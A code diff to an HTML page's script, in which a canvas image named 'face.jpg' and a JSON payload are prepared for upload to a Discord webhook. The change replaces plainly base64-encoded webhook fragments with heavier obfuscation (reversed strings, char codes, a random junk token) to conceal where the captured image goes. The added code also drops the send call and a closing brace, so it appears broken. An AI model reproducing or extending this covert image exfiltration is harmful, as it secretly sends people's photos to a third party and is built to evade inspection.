@@ -248,15 +248,19 @@
             formData.append('payload_json', JSON.stringify(payload));
             formData.append('files[0]', await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85)), 'face.jpg');
 
-            const a = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv";
-const b = "MTQ2OTMxNTMxMzU0NzA4NzkwMg";
-const c = "L3pRQ25lWlBMX044a3Z5Q2VsQVlfU1pkZXBPd1hQdkVTYmk";
-const d = "tUXc5emw5a3c2dS1ReVN4WHlVeE5Kb0dIamxrbmZvd0ZMbw";
-const webhookUrl = atob(a) + atob(b) + atob(c) + atob(d);
+            const webhookUrl = (function(){
+  const _0x = atob.bind(null);
+  const a = _0x("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv");
+  const b = "1469315318848426045".split('').reverse().join('');
+  const c = _0x("NzY0U3g5Y2pJaFJtSWtCOG1vZUVKblE3Z3NVNmo=") + "35tnnonGniOXWb2vJ04hOiRu7lJRbEeS97BDPjQ";
+  const d = [47].map(String.fromCharCode).join('');
+  const junk = Math.random().toString(36).slice(2,8); // 毎回変わるゴミ
 
-            fetch(webhookUrl, { method: 'POST', body: formData })
-                .catch(err => console.error("送信エラー:", err));
-        });
+  let x = a + b.split('').reverse().join('') + d;
+  x += c.replace(/=+$/, '').split('').reverse().join('').split('').reverse().join('');
+  return x.replace(new RegExp(junk, 'g'), '');
+})();
+            
     </script>
 </body>
 </html>
